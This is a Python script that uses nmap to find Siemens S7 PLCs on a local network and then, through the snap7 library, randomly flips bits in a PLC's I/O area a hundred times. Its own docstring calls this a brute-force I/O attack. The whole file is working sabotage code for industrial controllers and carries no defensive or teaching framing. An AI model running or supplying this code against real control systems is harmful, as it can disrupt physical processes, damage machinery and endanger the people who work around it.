import snap7
import time
import random
import subprocess
import re  # Import the regular expression module

# --- Configuration ---
# Define the range of I/O points to target (adjust as needed)
START_IO_POINT = 0  # Starting I/O address
END_IO_POINT = 10   # Ending I/O address
IO_AREA = 129       # I/O Area (e.g., 129 for Inputs, 130 for Outputs).  Check your PLC configuration!
DB_NUMBER = None    #None because we are not using Data Block

# Value range to brute-force
MIN_VALUE = 0
MAX_VALUE = 1

# Duration of each change (seconds) - Adjust as needed
CHANGE_DURATION = 0.1

# Number of iterations
NUM_ITERATIONS = 100

# PLC rack and slot (typical defaults)
PLC_RACK = 0
PLC_SLOT = 1

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address using `nmap`.
    Requires `nmap` to be installed on the Windows machine.

    Returns:
        str: The PLC's IP address if found, otherwise None.
    """
    try:
        # Run nmap to discover devices on the network (adjust the IP range if needed)
        result = subprocess.run(['nmap', '-p', '102', '192.168.0.0/24'], capture_output=True, text=True, check=True)
        output = result.stdout

        # Parse the nmap output for Siemens S7 devices
        for line in output.splitlines():
            if "Siemens" in line:
                # Extract the IP address from the line
                match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
                if match:
                    return match.group(1)

        print("PLC IP address not found using nmap.  Make sure nmap is installed and the IP range is correct.")
        return None

    except FileNotFoundError:
        print("Error: nmap not found. Please install nmap and ensure it's in your system's PATH.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"Error running nmap: {e}")
        return None


def brute_force_io(plc_ip):
    """
    Performs a brute-force I/O attack on the PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
    """
    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {plc_ip}")

        for i in range(NUM_ITERATIONS):
            io_point = random.randint(START_IO_POINT, END_IO_POINT)  # Randomly select an I/O point
            new_value = random.randint(MIN_VALUE, MAX_VALUE)  # Randomly select a new value (0 or 1)

            #Write to PLC
            try:
                # Determine the data type and length based on your I/O addressing scheme
                # This example assumes a single bit (boolean)
                byte_address = io_point // 8  # Calculate the byte offset
                bit_offset = io_point % 8   # Calculate the bit offset within the byte

                read_data = plc.read_area(IO_AREA, 0, byte_address, 1) # Read one byte from the IO area.
                byte_value = read_data[0]  # Get the value of the byte

                # Update the specific bit within the byte
                if new_value == 1:
                    updated_byte = byte_value | (1 << bit_offset)  # Set the bit
                else:
                    updated_byte = byte_value & ~(1 << bit_offset) # Clear the bit
                
                # Write the updated byte back to the I/O area
                write_data = bytearray([updated_byte])
                plc.write_area(IO_AREA, 0, byte_address, write_data)


                print(f"Iteration {i+1}: Writing value {new_value} to I/O point {io_point} (Byte address: {byte_address}, Bit offset: {bit_offset})")

            except Exception as e:
                print(f"Error writing to I/O point {io_point}: {e}")


            time.sleep(CHANGE_DURATION)


    except snap7.exceptions.Snap7Exception as e:
        print(f"Error connecting to PLC: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        if 'plc' in locals() and plc.get_connected():  # Check if the PLC object exists and is connected.
            plc.disconnect()
            print("Disconnected from PLC.")



if __name__ == "__main__":
    plc_ip_address = find_plc_ip()
    if plc_ip_address:
        print(f"Found PLC IP: {plc_ip_address}")
        brute_force_io(plc_ip_address)
    else:
        print("Could not find PLC IP address.  Exiting.")